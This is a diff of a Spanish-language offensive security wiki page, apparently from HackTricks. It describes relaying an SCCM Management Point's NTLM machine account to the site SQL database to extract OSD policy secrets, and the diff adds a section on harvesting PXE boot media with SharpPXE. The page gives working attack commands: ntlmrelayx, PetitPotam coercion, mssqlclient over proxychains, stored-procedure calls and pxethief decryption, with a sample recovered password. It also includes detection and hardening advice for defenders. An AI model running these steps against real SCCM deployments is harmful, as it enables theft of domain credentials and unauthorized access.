@@ -1,41 +1,41 @@
-# Extracción de secretos de políticas OSD mediante NTLM Relay en el Punto de Gestión de SCCM
+# SCCM Management Point NTLM Relay to SQL – Extracción de secretos de políticas OSD
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TL;DR
-Al forzar un **Punto de Gestión (MP) de System Center Configuration Manager (SCCM)** a autenticar a través de SMB/RPC y **retransmitir** esa cuenta de máquina NTLM a la **base de datos del sitio (MSSQL)**, obtienes derechos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Estos roles te permiten llamar a un conjunto de procedimientos almacenados que exponen blobs de políticas de **Despliegue del Sistema Operativo (OSD)** (credenciales de la Cuenta de Acceso a la Red, variables de Secuencia de Tareas, etc.). Los blobs están codificados/encriptados en hexadecimales, pero pueden ser decodificados y desencriptados con **PXEthief**, obteniendo secretos en texto plano.
+## Resumen
+Forzando a un **System Center Configuration Manager (SCCM) Management Point (MP)** para que se autentique vía SMB/RPC y **relayeando** esa cuenta máquina NTLM hacia la **site database (MSSQL)** obtienes los permisos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Estos roles te permiten invocar un conjunto de stored procedures que exponen blobs de políticas de **Operating System Deployment (OSD)** (credenciales del Network Access Account, variables de Task-Sequence, etc.). Los blobs están codificados/encriptados en hex pero pueden decodificarse y desencriptarse con **PXEthief**, obteniendo los secretos en texto plano.
 
 Cadena de alto nivel:
-1. Descubrir MP y base de datos del sitio ↦ punto final HTTP no autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+1. Descubrir MP y site DB ↦ endpoint HTTP no autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Iniciar `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
-3. Forzar MP usando **PetitPotam**, PrinterBug, DFSCoerce, etc.
-4. A través del proxy SOCKS, conectarse con `mssqlclient.py -windows-auth` como la cuenta retransmitida **<DOMAIN>\\<MP-host>$**.
+3. Forzar al MP usando PetitPotam, PrinterBug, DFSCoerce, etc.
+4. A través del proxy SOCKS conéctate con `mssqlclient.py -windows-auth` como la cuenta reenviada **<DOMAIN>\\<MP-host>$**.
 5. Ejecutar:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
 * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (o `MP_GetPolicyBodyAfterAuthorization`)
-6. Eliminar `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
+6. Quitar BOM `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
 
-Secretos como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. se recuperan sin tocar PXE o clientes.
+Secretos como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. se recuperan sin tocar PXE ni los clientes.
 
 ---
 
-## 1. Enumerando puntos finales MP no autenticados
-La extensión ISAPI del MP **GetAuth.dll** expone varios parámetros que no requieren autenticación (a menos que el sitio sea solo PKI):
+## 1. Enumeración de endpoints MP no autenticados
+La extensión ISAPI del MP **GetAuth.dll** expone varios parámetros que no requieren autenticación (a menos que el sitio sea PKI-only):
 
 | Parámetro | Propósito |
-|-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | Devuelve la clave pública del certificado de firma del sitio + GUIDs de dispositivos **Todos los Computadores Desconocidos** *x86* / *x64*. |
-| `MPLIST` | Lista cada Punto de Gestión en el sitio. |
-| `SITESIGNCERT` | Devuelve el certificado de firma del Sitio Primario (identifica el servidor del sitio sin LDAP). |
+|-----------|-----------|
+| `MPKEYINFORMATIONMEDIA` | Devuelve la clave pública del certificado de firma del sitio + GUIDs de dispositivos *x86* / *x64* **All Unknown Computers**. |
+| `MPLIST` | Lista todos los Management-Point en el sitio. |
+| `SITESIGNCERT` | Devuelve el certificado de firma del Primary-Site (identifica el servidor del sitio sin LDAP). |
 
-Obtén los GUIDs que actuarán como el **clientID** para consultas posteriores a la base de datos:
+Obtén los GUIDs que actuarán como el **clientID** para consultas a la BD posteriores:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
 ---
 
-## 2. Reenviar la cuenta de máquina MP a MSSQL
+## 2. Relay la cuenta de equipo MP a MSSQL
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -44,7 +44,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-Cuando se activa la coerción, deberías ver algo como:
+Cuando la coercion se active deberías ver algo como:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -56,9 +56,9 @@ Conéctese a través del proxy SOCKS (puerto 1080 por defecto):
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-Cambia a la base de datos **CM_<SiteCode>** (usa el código de sitio de 3 dígitos, por ejemplo, `CM_001`).
+Cambie a la base de datos **CM_<SiteCode>** (utilice el código de sitio de 3 dígitos, p. ej. `CM_001`).
 
-### 3.1  Encontrar GUIDs de Computadoras Desconocidas (opcional)
+### 3.1 Encontrar GUIDs de Unknown-Computer (opcional)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
@@ -69,19 +69,19 @@ WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-Cada fila contiene `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.
+Cada fila contiene `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.
 
 Enfócate en las políticas:
-* **NAAConfig**  – Credenciales de la cuenta de acceso a la red
-* **TS_Sequence** – Variables de la secuencia de tareas (OSDJoinAccount/Password)
-* **CollectionSettings** – Puede contener cuentas de ejecución
+* **NAAConfig**  – credenciales de Network Access Account
+* **TS_Sequence** – variables de Task Sequence (OSDJoinAccount/Password)
+* **CollectionSettings** – Puede contener cuentas run-as
 
-### 3.3  Recuperar cuerpo completo
-Si ya tienes `PolicyID` y `PolicyVersion`, puedes omitir el requisito de clientID usando:
+### 3.3  Recuperar el Body completo
+Si ya tienes `PolicyID` y `PolicyVersion` puedes omitir el requisito de clientID usando:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> IMPORTANTE: En SSMS aumenta "Máximo de caracteres recuperados" (>65535) o el blob será truncado.
+> IMPORTANTE: En SSMS aumente “Maximum Characters Retrieved” (>65535) o el blob será truncado.
 
 ---
 
@@ -103,16 +103,16 @@ NetworkAccessPassword: P4ssw0rd123
 ---
 
 ## 5. Roles y procedimientos SQL relevantes
-Al realizar el relay, el inicio de sesión se asigna a:
+Tras el relay, el login se mapea a:
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-Estos roles exponen docenas de permisos EXEC, los más importantes utilizados en este ataque son:
+Estos roles exponen docenas de permisos EXEC; los principales usados en este ataque son:
 
-| Procedimiento Almacenado | Propósito |
-|--------------------------|-----------|
-| `MP_GetMachinePolicyAssignments` | Listar políticas aplicadas a un `clientID`. |
-| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Devolver el cuerpo completo de la política. |
+| Procedimiento almacenado | Propósito |
+|-------------------------|-----------|
+| `MP_GetMachinePolicyAssignments` | Lista las políticas aplicadas a un `clientID`. |
+| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Devuelve el cuerpo completo de la política. |
 | `MP_GetListOfMPsInSiteOSD` | Devuelto por la ruta `MPKEYINFORMATIONMEDIA`. |
 
 Puedes inspeccionar la lista completa con:
@@ -126,23 +126,34 @@ AND  pe.permission_name='EXECUTE';
 ```
 ---
 
-## 6. Detección y Fortalecimiento
-1. **Monitorear inicios de sesión de MP** – cualquier cuenta de computadora de MP que inicie sesión desde una IP que no sea su host ≈ relay.
-2. Habilitar **Protección Extendida para Autenticación (EPA)** en la base de datos del sitio (`PREVENT-14`).
-3. Deshabilitar NTLM no utilizado, hacer cumplir la firma SMB, restringir RPC (
-mismas mitigaciones utilizadas contra `PetitPotam`/`PrinterBug`).
-4. Fortalecer la comunicación MP ↔ DB con IPSec / mutual-TLS.
+## 6. PXE boot media harvesting (SharpPXE)
+* **PXE reply over UDP/4011**: enviar una solicitud de arranque PXE a un Distribution Point configurado para PXE. La respuesta proxyDHCP revela rutas de arranque como `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) y `SMSBoot\\x64\\pxe\\boot.bcd`, además de un posible blob de clave cifrada.
+* **Retrieve boot artifacts via TFTP**: usar las rutas devueltas para descargar `variables.dat` vía TFTP (sin autenticación). El archivo es pequeño (unos pocos KB) y contiene las variables de medios cifradas.
+* **Decrypt or crack**:
+- Si la respuesta incluye la clave de desencriptado, pásala a **SharpPXE** para descifrar `variables.dat` directamente.
+- Si no se proporciona clave (PXE media protegida por una contraseña personalizada), SharpPXE emite un hash **Hashcat-compatible** `$sccm$aes128$...` para cracking offline. Tras recuperar la contraseña, descifrar el archivo.
+* **Parse decrypted XML**: las variables en texto plano contienen metadata de despliegue SCCM (**Management Point URL**, **Site Code**, GUIDs de medios y otros identificadores). SharpPXE las parsea e imprime un comando listo para ejecutar de **SharpSCCM** con los parámetros GUID/PFX/site precargados para abuso posterior.
+* **Requirements**: solo necesitan conectividad de red al listener PXE (UDP/4011) y TFTP; no se requieren privilegios de admin local.
 
 ---
 
-## Ver también
-* Fundamentos de relay NTLM:
+## 7. Detection & Hardening
+1. **Monitor MP logins** – cualquier cuenta de equipo MP que inicie sesión desde una IP que no sea su host ≈ relay.
+2. Habilitar **Extended Protection for Authentication (EPA)** en la base de datos del sitio (`PREVENT-14`).
+3. Deshabilitar NTLM no usado, aplicar SMB signing, restringir RPC (mismas mitigaciones usadas contra `PetitPotam`/`PrinterBug`).
+4. Endurecer la comunicación MP ↔ DB con IPSec / mutual-TLS.
+5. **Limitar la exposición PXE** – filtrar UDP/4011 y TFTP a VLANs de confianza, requerir contraseñas PXE, y alertar sobre descargas TFTP de `SMSBoot\\*\\pxe\\variables.dat`.
+
+---
+
+## See also
+* NTLM relay fundamentals:
 
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
-* Abuso de MSSQL y post-explotación:
+* MSSQL abuse & post-exploitation:
 
 {{#ref}}
 abusing-ad-mssql.md
@@ -150,8 +161,9 @@ abusing-ad-mssql.md
 
 
 
-## Referencias
-- [Me gustaría hablar con su gerente: Robando secretos con relays de punto de gestión](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+## References
+- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
-- [Gestor de Configuraciones Incorrectas – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [SharpPXE](https://github.com/leftp/SharpPXE)
 {{#include ../../banners/hacktricks-training.md}}
